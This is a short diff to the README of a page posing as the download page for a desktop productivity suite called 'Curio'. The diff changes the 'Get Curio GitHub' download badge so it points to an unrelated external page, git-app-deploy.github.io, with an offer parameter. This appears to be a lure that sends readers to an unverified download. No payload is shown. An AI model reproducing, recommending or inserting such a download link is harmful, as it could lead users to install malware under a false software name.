@@ -1,6 +1,6 @@
 # Curio Download — Desktop Productivity Suite
 
-[![Get Curio GitHub](https://img.shields.io/badge/Get%20Curio%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](?offer=Curio)
+[![Get Curio GitHub](https://img.shields.io/badge/Get%20Curio%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Curio)
 
 ---
 
